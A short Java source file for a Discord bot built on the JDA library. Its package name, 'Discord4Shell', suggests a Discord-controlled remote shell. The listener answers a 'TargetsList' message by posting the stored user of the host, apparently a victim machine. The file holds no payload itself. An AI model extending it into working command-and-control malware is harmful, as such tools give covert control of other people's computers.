package org.example.commands;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import static org.example.Discord4Shell.Discord4Shell.user;

public class TargetsListMessage extends ListenerAdapter {
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
            return;
        }

        if (event.getMessage().getContentRaw().equalsIgnoreCase("TargetsList")) {
            event.getChannel().sendMessage(user + " ").queue();
        }
    }
}
